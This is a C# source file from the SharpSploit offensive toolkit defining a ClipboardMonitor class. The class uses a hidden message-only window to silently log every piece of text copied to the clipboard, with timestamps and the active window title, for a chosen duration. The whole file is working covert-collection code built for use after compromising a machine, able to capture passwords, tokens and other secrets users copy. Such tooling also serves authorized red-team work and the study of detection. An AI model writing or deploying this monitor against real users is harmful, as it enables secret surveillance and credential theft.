// Nick Muir (@_shellfarmer)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using PInvoke = SharpSploit.Execution.PlatformInvoke;

namespace SharpSploit.Enumeration
{
    /// <summary>
    /// ClipboardMonitor allows for the monitoring of Clipboard text content.
    /// </summary>
    public class ClipboardMonitor
    {
        private static StringBuilder Builder = new StringBuilder();
        private class NotificationForm : Form
            {
                public NotificationForm()
                {
                    PInvoke.Win32.User32.SetParent(Handle, new IntPtr(-3));
                    PInvoke.Win32.User32.AddClipboardFormatListener(Handle);
                }

                protected override void WndProc(ref Message m)
                {
                    if (m.Msg == 0x031D)
                    {
                        Thread t = new Thread((ThreadStart)(() => {
                            // Currently only handles text data  in clipboard
                            if (Clipboard.ContainsText())
                            {
                                Builder.AppendLine(String.Format("[+] Collected: {0:HH:mm:ss.fff}", DateTime.Now));
                                Builder.AppendLine(String.Format("[+] Window Title: {0}", GetActiveWindowTitle()));
                                Builder.AppendLine(String.Format("[+] Data:\r\n{0}\r\n", Clipboard.GetText()));
                            }
                        }));

                        t.SetApartmentState(ApartmentState.STA);
                        t.Start();
                        t.Join();
                    }
                    base.WndProc(ref m);
                }
            }

        /// <summary>
        /// Starts the ClipbooardMonitor
        /// </summary>
        /// <author>Nick Muir (@_shellfarmer)</author>
        /// <returns>String containing the captured clipboard contents, along with identification of what window they were copied from.</returns>
        /// <param name="Seconds">The amount of time in seconds the clipboard monitor should run for before returning data.</param>
        public static string StartClipboardMonitor(int Seconds)
        {
            Builder.AppendLine(String.Format("[*] Starting Clipboard Monitor for {0} seconds.\r\n", Seconds));

            using (System.Timers.Timer timer = new System.Timers.Timer(Seconds * 1000))
            {
                timer.Elapsed += (source, e) =>
                {
                    Builder.AppendLine(String.Format("\r\n[*] Finished Clipboard Monitor at {0:HH:mm:ss.fff}", DateTime.Now));
                    timer.Stop();
                    Application.Exit();
                };
                timer.Start();
                Application.Run(new NotificationForm());
                return Builder.ToString();
            }
        }

        /// <summary>
        /// Gets the active window title of the window keystrokes are being entered in.
        /// </summary>
        /// <author>Scottie Austin (@checkymander)</author>
        /// <returns>Title of the active window.</returns>
        private static string GetActiveWindowTitle()
        {
            const int capacity = 256;
            StringBuilder builder = new StringBuilder(capacity);
            IntPtr handle = PInvoke.Win32.User32.GetForegroundWindow();

            if (PInvoke.Win32.User32.GetWindowText(handle, builder, capacity) > 0)
            {
                return builder.ToString();
            }
            return null;
        }
    }
}
